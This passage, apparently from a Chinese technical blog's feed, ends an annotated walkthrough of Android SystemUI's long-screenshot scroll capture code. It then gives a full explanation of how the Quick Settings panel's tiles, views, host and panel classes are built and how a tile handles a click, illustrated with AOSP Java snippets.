!mLastScrollCaptureResponse.isConnected()) &#123;</span><br><span class="line">            <span class="comment">// No connection means that the target window wasn&#x27;t found</span></span><br><span class="line">            <span class="comment">// or that it cannot support scroll capture.</span></span><br><span class="line">            Log.d(TAG, <span class="string">&quot;ScrollCapture: &quot;</span> + mLastScrollCaptureResponse.getDescription() + <span class="string">&quot; [&quot;</span></span><br><span class="line">                    + mLastScrollCaptureResponse.getWindowTitle() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;ScrollCapture: connected to window [&quot;</span></span><br><span class="line">                + mLastScrollCaptureResponse.getWindowTitle() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        <span class="comment">// 滚动捕获响应，这和 网络请求中，响应头类似， response 里有很多的数据。</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ScrollCaptureResponse</span> <span class="variable">response</span> <span class="operator">=</span> mLastScrollCaptureResponse;</span><br><span class="line">        <span class="comment">// 截取更多内容按钮，即长截屏按钮；这里确实奇怪：还没点击长截屏，有些数据就已经捕获好了，例如：显示范围内的窗口边界、窗口空间中滚动内容的边界、当前窗口标题等等数据。</span></span><br><span class="line">        mScreenshotView.showScrollChip(response.getPackageName(), <span class="comment">/* onClick */</span> () -&gt; &#123;</span><br><span class="line">            <span class="type">DisplayMetrics</span> <span class="variable">displayMetrics</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DisplayMetrics</span>();</span><br><span class="line">            getDefaultDisplay().getRealMetrics(displayMetrics);</span><br><span class="line">            <span class="comment">// 新的位图 Bitmap  。</span></span><br><span class="line">            <span class="type">Bitmap</span> <span class="variable">newScreenshot</span> <span class="operator">=</span> captureScreenshot(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Rect</span>(<span class="number">0</span>, <span class="number">0</span>, displayMetrics.widthPixels, displayMetrics.heightPixels));</span><br><span class="line">            <span class="comment">// 设置视图，这里只是一个缩略图，和普通截图一样大；</span></span><br><span class="line">            mScreenshotView.prepareScrollingTransition(response, mScreenBitmap, newScreenshot,</span><br><span class="line">                    mScreenshotTakenInPortrait);</span><br><span class="line">            <span class="comment">// delay starting scroll capture to make sure the scrim is up before the app moves</span></span><br><span class="line">            <span class="comment">// 捕获视图。长截图会在 LongScreenshotActivity 显示。</span></span><br><span class="line">            mScreenshotView.post(() -&gt; runBatchScrollCapture(response));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException | ExecutionException e) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;requestScrollCapture failed&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">runBatchScrollCapture</span><span class="params">(ScrollCaptureResponse response)</span> &#123;</span><br><span class="line">    <span class="comment">// Clear the reference to prevent close() in dismissScreenshot</span></span><br><span class="line">    mLastScrollCaptureResponse = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (mLongScreenshotFuture != <span class="literal">null</span>) &#123;</span><br><span class="line">        mLongScreenshotFuture.cancel(<span class="literal">true</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// 通过 response 得到 LongScreen 的视图。</span></span><br><span class="line">    mLongScreenshotFuture = mScrollCaptureController.run(response);</span><br><span class="line">    mLongScreenshotFuture.addListener(() -&gt; &#123;</span><br><span class="line">        ScrollCaptureController.LongScreenshot longScreenshot;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取 longScreenshot 。</span></span><br><span class="line">            longScreenshot = mLongScreenshotFuture.get();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CancellationException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Long screenshot cancelled&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException | ExecutionException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Exception&quot;</span>, e);</span><br><span class="line">            mScreenshotView.restoreNonScrollingUi();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (longScreenshot.getHeight() == <span class="number">0</span>) &#123;</span><br><span class="line">            mScreenshotView.restoreNonScrollingUi();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 相当于数据保存，把截图数据设置进去，但这里不是存储在本地。</span></span><br><span class="line">        mLongScreenshotHolder.setLongScreenshot(longScreenshot);</span><br><span class="line">        mLongScreenshotHolder.setTransitionDestinationCallback(</span><br><span class="line">                (transitionDestination, onTransitionEnd) -&gt;</span><br><span class="line">                        mScreenshotView.startLongScreenshotTransition(</span><br><span class="line">                                transitionDestination, onTransitionEnd,</span><br><span class="line">                                longScreenshot));</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(mContext, LongScreenshotActivity.class);</span><br><span class="line">        intent.setFlags(</span><br><span class="line">                Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);</span><br><span class="line">        <span class="comment">// 跳转到编辑界面，也可以叫预览界面吧。</span></span><br><span class="line">        mContext.startActivity(intent,</span><br><span class="line">                ActivityOptions.makeCustomAnimation(mContext, <span class="number">0</span>, <span class="number">0</span>).toBundle());</span><br><span class="line">        <span class="type">RemoteAnimationAdapter</span> <span class="variable">runner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteAnimationAdapter</span>(</span><br><span class="line">                SCREENSHOT_REMOTE_RUNNER, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            WindowManagerGlobal.getWindowManagerService()</span><br><span class="line">                    .overridePendingAppTransitionRemote(runner, DEFAULT_DISPLAY);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Error overriding screenshot app transition&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, mMainExecutor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android SystemUI 通知面板实现</title>
      <link href="/2024/02/03/2024-02-03/"/>
      <url>/2024/02/03/2024-02-03/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这篇文章给大家分享下Android SystemUI中下拉通知面板时所看到的开关面板(即QS面板)的实现原理,包括其整体架构,UI构建流程与事件处理流程,对这块感兴趣的同学可以看看</p><h3 id="一-QS面板构成元素解析"><a href="#一-QS面板构成元素解析" class="headerlink" title="一. QS面板构成元素解析"></a>一. QS面板构成元素解析</h3><p>QS面板实际上有多种状态,包括:</p><ul><li><strong>Quick Quick Settings (QQS)</strong> : 即初级展开面板,是一次下拉面板看到的简版QS面板,包含少量的开关,如下左侧的图</li><li><strong>Quick Settings (QS)</strong> : 完整QS面板,是二次下拉面板看到的完成QS面板,其包含更多的开关,如下右侧的图</li><li>另外还有开关编辑面板,开关详情页面,本文不展开描述</li></ul><p><img src="/images/20240203/20240203001.png"></p><p>备注:SystemUI中称通知栏下拉面板开关区域中的单个开关为<strong>Tile</strong></p><p>先看看整个QS面板中主要的几大类簇:</p><p><img src="/images/20240203/20240203002.png"></p><p>下面分别介绍各个类簇的主要作用</p><p><strong>1. QSTile类簇</strong>,该类簇包括的主要类如下,类图如下</p><p><img src="/images/20240203/20240203003.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">packages/SystemUI/plugin/src/com/android/systemui/plugins/qs/QSTile.java</span><br><span class="line">packages/SystemUI/src/com/android/systemui/qs/tileimpl/QSTileImpl.java</span><br><span class="line">packages/SystemUI/src/com/android/systemui/qs/tiles/WifiTile.java</span><br><span class="line">packages/SystemUI/src/com/android/systemui/qs/tiles/XxxTile.java</span><br></pre></td></tr></table></figure><p>该类簇构成了的<strong>Tile</strong>的”后端”,负责处理单个<strong>Tile</strong>的逻辑处理,其中:</p><ul><li><strong>QSTile</strong> : 接口,主要定义了所有<strong>Tile</strong>的通用行为,如<strong>注册监听,点击事件的处理</strong>,Tile视图中Icon元素(QSIconView)的构建,刷新Tile状态(state)等</li><li><strong>QSTileImpl</strong> : 实现了<strong>QSTile</strong> 定义的通用行为,同时提供了一系列的抽象接口(详见类图)允许不同类型的子类去做差异化实现.后续所有的开关都需要继承自<strong>QSTileImpl</strong>. 如<strong>WifiTile</strong>,通过继承<strong>QSTileImpl</strong>来享用其提供的通用方法,不需要每个开关都去做实现,同时利用差异化接口便可实现开关自身的特有逻辑,如<strong>WifiTile</strong>的<strong>handleClick</strong>可以打开Wifi开关,而BluetoothTile的handleClick则可以打开蓝牙开关</li></ul><p><strong>2. QSTileView类簇</strong> 该类簇包括的主要类如下,类图如下</p><p><img src="/images/20240203/20240203004.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">packages/SystemUI/plugin/src/com/android/systemui/plugins/qs/QSTileView.java</span><br><span class="line">packages/SystemUI/src/com/android/systemui/qs/tileimpl/QSTileBaseView.java</span><br><span class="line">packages/SystemUI/src/com/android/systemui/qs/tileimpl/QSTileView.java</span><br><span class="line">packages/SystemUI/plugin/src/com/android/systemui/plugins/qs/QSIconView.java</span><br><span class="line">packages/SystemUI/src/com/android/systemui/qs/tileimpl/QSIconViewImpl.java</span><br></pre></td></tr></table></figure><p>该类簇构成了的Tile的视图层,负责处理单个<strong>Tile</strong>的界面展示,其中:</p><ul><li><strong>qs/QSTileView</strong> : 抽象类,定义了<strong>Tile</strong>视图相关的操作,如点击事件设置,视图刷新**onStateChanged(State state)**等</li><li><strong>QSTileBaseView</strong> : 实现了<strong>QSTileView</strong>中定义的抽象接口,同时在其构造方法中完成了<strong>Tile</strong>视图的构建,包括背景的处理,点击效果的处理(如ripple),点击事件的处理等. <strong>在QQS面板中使用</strong></li><li><strong>QSTileView</strong> : 注意与上面的同名抽象类区分开来,这里的起名容易让人疑惑,实际上这里的<strong>QSTileView</strong>继承了<strong>QSTileBaseView</strong>,在其构建的视图的基础上,扩展了<strong>label</strong>相关的东西,<strong>label</strong>即为开关中的文字描述视图,如蓝牙开关对应的<strong>label</strong>为”蓝牙”. 在QS面板中使用</li></ul><p><strong>3. QSHost类簇</strong>,该类簇包括的主要类如下,类图如下</p><p><img src="/images/20240203/20240203005.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">packages/SystemUI/src/com/android/systemui/qs/QSHost.java</span><br><span class="line">packages/SystemUI/src/com/android/systemui/qs/QSTileHost.java</span><br><span class="line">packages/SystemUI/plugin/src/com/android/systemui/plugins/qs/QSFactory.java</span><br><span class="line">packages/SystemUI/src/com/android/systemui/qs/tileimpl/QSFactoryImpl.java</span><br></pre></td></tr></table></figure><p>该类簇主要完成单个<strong>Tile</strong>的构建,其中:</p><ul><li><strong>QSHost</strong> : 接口,主要向外界提供获取<strong>QSTile</strong>集合的接口(getTiles())以及作为Tile对外沟通的桥梁,例如点击某个开关后需要触发收起面板的操作,开关便会通过<strong>QSHost</strong>来触发收起面板的操作</li><li><strong>QSTileHost</strong> : 实现了<strong>QSHost</strong>中定义的接口,同时扩展了创建Tile后端对象QSTile和创建Tile视图对象<strong>QSTileView</strong>的接口. 创建时使用了工厂模式,由<strong>QSFactoryImpl</strong>类实现</li></ul><p>其中<strong>QSTileHost</strong>作为外界创建Tile的入口,<strong>会在对象构造的过程中先去创建Tile后端对象QSTile集合</strong>,这个集合在后续创建完整Tile对象时会用到. 具体创建哪些Tile则是通过获取配置在 <strong>config.xml</strong> 中的字段来决定了,具体过程可查看 <strong>QSTileHost.onTuningChanged(String key, String newValue)</strong> 方法</p><p><strong>4. QSPanel类簇</strong>,该类簇包括的主要类如下,类图如下</p><p><img src="/images/20240203/20240203006.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">packages/SystemUI/src/com/android/systemui/qs/QSPanel.java</span><br><span class="line">packages/SystemUI/src/com/android/systemui/qs/QuickQSPanel.java</span><br><span class="line">packages/SystemUI/src/com/android/systemui/qs/QSPanel<span class="comment">#QSTileLayout</span></span><br><span class="line">packages/SystemUI/src/com/android/systemui/qs/TileLayout.java</span><br><span class="line">packages/SystemUI/src/com/android/systemui/qs/PagedTileLayout.java</span><br></pre></td></tr></table></figure><p>该类簇主要完成QS面板元素的动态添加,其中:</p><ul><li><strong>QSPanel</strong> : 对应我们前面说的QS面板,即二次展开面板,是该页面的顶层容器,其嵌套在一个<strong>ScrollView</strong>中. 负责动态添加相应的元素,添加的元素包括 [亮度条 / 根据屏幕方向动态添加开关容器 QSTileLayout / Footer ] 等. 同时为这些元素提供了一系列的操作接口,如<blockquote><p>为开关容器创建具体开关对象(通过QSHost) 并为其添加刷新监听器,在后续开关后端收到开关状态刷新需求时,将刷新需求分发到对应的开关视图层.<br>开关详情页(Details)的创建与刷新<br>QS面板展开状态变化时做相应的处理(setExpanded(boolean expanded))</p></blockquote></li><li><strong>QuickQSPanel</strong> : 对应我们前面说的初级展开面板QQS面板,继承自QSPanel并对展示的Tile数做了限制(通过setMaxTiles(int)),同时复写了父类提供的添加子元素的方法,按需添加QQS面板的元素,因为QQS面板是QS面板的精简版,所以很多子元素未做添加</li><li><strong>QSTileLayout</strong> : 开关容器接口,主要定义了开关容器绘制相关的接口</li><li><strong>TileLayout</strong> : QQS面板开关容器类,负责精简QS面板的绘制,继承自 Viewgroup</li><li><strong>PagedTileLayout</strong> : QS面板开关容器类,负责QS面板的绘制,继承自 ViewPager</li></ul><p>5.QS类簇,该类簇包括的主要类如下,类图如下</p><p><img src="/images/20240203/20240203007.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">packages/SystemUI/plugin/src/com/android/systemui/plugins/qs/QS.java</span><br><span class="line">packages/SystemUI/src/com/android/systemui/qs/QSFragment.java</span><br><span class="line">packages/SystemUI/src/com/android/systemui/qs/QSContainerImpl.java</span><br></pre></td></tr></table></figure><p>该类簇主要作为整个QS面板的顶层容器,主要处理QS面板的展开/收起逻辑,其中:</p><ul><li><strong>QS</strong> : 接口,主要定义了 QS 面板展开/收起相关的接口</li><li><strong>QSFragment</strong> : 继承自 <strong>Fragment</strong>,实现了 QS 接口,主要负责接收 QS 面板展开/收起状态的改变,并将最新状态同步给该 Fragment 中的 View 元素,如 QSContainerImpl</li><li><strong>QSContainerImpl</strong> : 添加到<strong>QSFragment</strong>中的自定义 View,继承自<strong>FrameLayout</strong>对应布局 <strong>qs_panel.xml</strong> ,主要通过接收来自 <strong>QSFragment</strong> 的面板展开/收起状态的变化并做刷新</li></ul><p>至此,整个QS面板中的关键类就介绍完了,下面将通过几条主线来洞悉整个QS面板的具体实现:</p><ul><li>QS面板开关集合构建流程</li><li>Tile后端是如何与Tile视图层产生联系的</li><li>Tile的一次点击事件背后的流程是怎么样的</li></ul><h3 id="二-QS面板内部实现梳理"><a href="#二-QS面板内部实现梳理" class="headerlink" title="二 QS面板内部实现梳理"></a>二 QS面板内部实现梳理</h3><h4 id="2-1-QS面板开关集合构建流程"><a href="#2-1-QS面板开关集合构建流程" class="headerlink" title="2.1 QS面板开关集合构建流程"></a>2.1 QS面板开关集合构建流程</h4><p>QsPanel 中除了创建各个开关View,还创建了亮度条,Footer等元素,本文重心放在开关的构建上,故不会分析其他元素的创建流程. 另外QsFragment / QSHost 等元素是在 SystemUI 启动流程中通过注入或反射构建的,其前期构建流程跳过分析<br>先看看整体的流程图</p><p><img src="/images/20240203/20240203008.png"></p><p>流程比较简单,对照源码阅读即可.简单说就是<strong>QSTileHost</strong>对象在构建初期就借助<strong>QSFactoryImpl</strong>工具对象提前创建好了各个开关的后端对象<strong>QSTile</strong>,而后<strong>QSPanel</strong>在初始化的过程中,再次利用<strong>QSTileHost</strong>去构建各个开关的视图对象<strong>QSTileView</strong>,至此一个完整的开关就构建完成,最后add到开关容器<strong>PagedTileLayout</strong>中去.若对上述各个类的作用不清楚的话可回头看看前面对各个类簇的介绍</p><h4 id="2-2-Tile后端-是如何与-Tile视图层-产生联系的"><a href="#2-2-Tile后端-是如何与-Tile视图层-产生联系的" class="headerlink" title="2.2 Tile后端 是如何与 Tile视图层 产生联系的"></a>2.2 Tile后端 是如何与 Tile视图层 产生联系的</h4><p>前面<strong>QSTile</strong>的类簇中我们可以看到其有多个内部类,与此相关的内部类包括 <strong>Callback</strong> 和 <strong>State</strong></p><p><img src="/images/20240203/20240203009.png"></p><p>Tile 视图与后端的联系就是借助这两个内部类以及<strong>QSPanel</strong>这个中介产生联系的,我们来看看代码.</p><p>前面 2.1小节我们在梳理QS面板开关集合构建流程时可以看到步骤10通过<strong>addTile</strong>函数来构建<strong>Tile</strong>开关对象,其代码细节如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">[packages/SystemUI/src/com/android/systemui/qs/QSPanel.java]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TileRecord</span> <span class="keyword">extends</span> <span class="title class_">Record</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> QSTile tile;</span><br><span class="line">        <span class="keyword">public</span> com.android.systemui.plugins.qs.QSTileView tileView;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> scanState;</span><br><span class="line">        <span class="keyword">public</span> QSTile.Callback callback;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> TileRecord <span class="title function_">addTile</span><span class="params">(<span class="keyword">final</span> QSTile tile, <span class="type">boolean</span> collapsedView)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">TileRecord</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TileRecord</span>();</span><br><span class="line">        r.tile = tile;</span><br><span class="line">        r.tileView = createTileView(tile, collapsedView); <span class="comment">// 构建开关视图层</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> QSTile.<span class="type">Callback</span> <span class="variable">callback</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QSTile</span>.Callback() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStateChanged</span><span class="params">(QSTile.State state)</span> &#123;</span><br><span class="line">                drawTile(r, state);</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;;</span><br><span class="line">        r.tile.addCallback(callback); <span class="comment">// 向开关后端注册回调</span></span><br><span class="line">        r.callback = callback;</span><br><span class="line">        r.tileView.init(r.tile); <span class="comment">// 初始化点击事件</span></span><br><span class="line">        r.tile.refreshState(); <span class="comment">// 首次刷新</span></span><br><span class="line">        mRecords.add(r);</span><br><span class="line">        mCachedSpecs = getTilesSpecs();</span><br><span class="line">        <span class="keyword">if</span> (mTileLayout != <span class="literal">null</span>) &#123;</span><br><span class="line">            mTileLayout.addTile(r); <span class="comment">// add到开关容器</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">drawTile</span><span class="params">(TileRecord r, QSTile.State state)</span> &#123;</span><br><span class="line">        r.tileView.onStateChanged(state); <span class="comment">// 将变化交给开关视图层</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到<strong>QSPanel</strong>向 <strong>r.tile</strong> 即后端注册了一个回调器,并在回调发生时将开关状态<strong>State</strong>传递给 <strong>r.tileView</strong> 即开关视图层去做视图刷新.<br>至于这个<strong>State</strong>是在哪里刷新的这个我们2.3 小节再分析.</p><h4 id="2-3-Tile的一次点击事件背后的流程是怎么样的"><a href="#2-3-Tile的一次点击事件背后的流程是怎么样的" class="headerlink" title="2.3 Tile的一次点击事件背后的流程是怎么样的"></a>2.3 Tile的一次点击事件背后的流程是怎么样的</h4><p>前面 2.2 小结介绍<strong>addTile</strong>函数时我们可以看到这么一句 <strong>r.tileView.init(r.tile)</strong> ; ,这里完成了将视图层的点击事件转交给后端的操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[packages/SystemUI/src/com/android/systemui/qs/tileimpl/QSTileBaseView.java]</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(QSTile tile)</span> &#123;</span><br><span class="line">        init(v -&gt; tile.click(), v -&gt; tile.secondaryClick(), view -&gt; &#123;</span><br><span class="line">            tile.longClick();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(OnClickListener click, OnClickListener secondaryClick,</span></span><br><span class="line"><span class="params">            OnLongClickListener longClick)</span> &#123;</span><br><span class="line">        setOnClickListener(click);</span><br><span class="line">        setOnLongClickListener(longClick);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>即将<strong>QSTileView</strong>收到的点击事件分别交给<strong>QSTile</strong>对应的点击函数处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[packages/SystemUI/src/com/android/systemui/qs/tileimpl/QSTileImpl.java]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">click</span><span class="params">()</span> &#123;</span><br><span class="line">        mHandler.sendEmptyMessage(H.CLICK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleMessage</span><span class="params">(Message msg)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.what == CLICK) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (mState.disabledByPolicy) &#123;</span><br><span class="line">                        ......</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        handleClick();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">handleClick</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p><strong>QSTileImpl</strong>中 <strong>handleClick()</strong> 函数是个抽象方法,分别由对应的开关子类去实现,例如Wifi开关</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[packages/SystemUI/src/com/android/systemui/qs/tiles/WifiTile.java]</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">handleClick</span><span class="params">()</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">        refreshState(wifiEnabled ? <span class="literal">null</span> : ARG_SHOW_TRANSIENT_ENABLING);</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>又回到<strong>QSTileImpl</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[packages/SystemUI/src/com/android/systemui/qs/tileimpl/QSTileImpl.java]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">refreshState</span><span class="params">(Object arg)</span> &#123;</span><br><span class="line">        mHandler.obtainMessage(H.REFRESH_STATE, arg).sendToTarget();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleMessage</span><span class="params">(Message msg)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (msg.what == REFRESH_STATE) &#123;</span><br><span class="line">                    handleRefreshState(msg.obj);</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">handleRefreshState</span><span class="params">(Object arg)</span> &#123;</span><br><span class="line">        handleUpdateState(mTmpState, arg);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">changed</span> <span class="operator">=</span> mTmpState.copyTo(mState);</span><br><span class="line">        <span class="keyword">if</span> (changed) &#123;</span><br><span class="line">            handleStateChanged();</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">handleUpdateState</span><span class="params">(TState state, Object arg)</span>;</span><br></pre></td></tr></table></figure><p>可以看到<strong>QSTileImpl</strong>用一个<strong>State</strong>类型的临时变量去<strong>handleUpdateState</strong>函数中收集当前开关的最新状态,而这个函数是个抽象方法,实现依旧是在各个开关子类中,我们看下Wifi开关</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 